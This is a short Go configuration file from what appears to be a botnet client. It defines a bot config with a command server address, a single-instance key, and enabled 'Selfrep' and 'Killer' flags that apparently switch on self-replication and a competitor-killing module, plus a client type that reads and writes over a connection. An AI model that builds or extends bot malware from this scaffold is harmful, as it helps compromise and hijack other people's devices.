package config

import (
	"client/core/networking"
)

type BotConfig struct {
	ServerAddress  string
	SingleInstance string
	Selfrep        bool
	Killer         bool
}

var Bot = &BotConfig{
	ServerAddress:  "localhost:69",
	SingleInstance: "2352",
	Selfrep:        true,
	Killer:         true,
}

type Client struct {
	Connection *networking.SecureConnection
}

func (client *Client) Write(data string) {
	client.Connection.Write([]byte(data))
}

func (client *Client) Read(size int) (string, error) {
	read, err := client.Connection.Read(size)
	if err != nil {
		return "", err
	}
	return string(read), nil
}
